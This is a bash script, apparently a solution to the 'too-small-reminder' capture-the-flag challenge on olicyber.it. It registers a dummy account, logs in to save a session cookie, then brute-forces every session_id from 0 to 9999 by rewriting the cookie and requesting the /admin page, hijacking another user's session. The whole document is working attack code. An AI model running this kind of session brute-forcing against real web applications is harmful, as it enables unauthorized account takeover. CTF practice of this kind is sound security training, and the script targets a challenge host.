#!/bin/bash

# Register a dummy user
curl \
	-H "Content-Type: application/json" \
	--data '{"username":"du","password":"dummy"}' \
	"http://too-small-reminder.challs.olicyber.it/register"

# Login and save cookie
curl \
	-H "Content-Type: application/json" \
	--data '{"username":"du","password":"dummy"}' \
	"http://too-small-reminder.challs.olicyber.it/login" \
	-c cookie

# Bruteforcing
for i in $(seq 0 9999); do
	# Replace session_id number
	sed -i 's/\(session_id\t\)\([0-9]\+\)/\1'"$i"'/' cookie

	# GET request to /admin using cookie
	curl -H "Content-Type: application/json" \
		"http://too-small-reminder.challs.olicyber.it/admin" \
		-b cookie
done

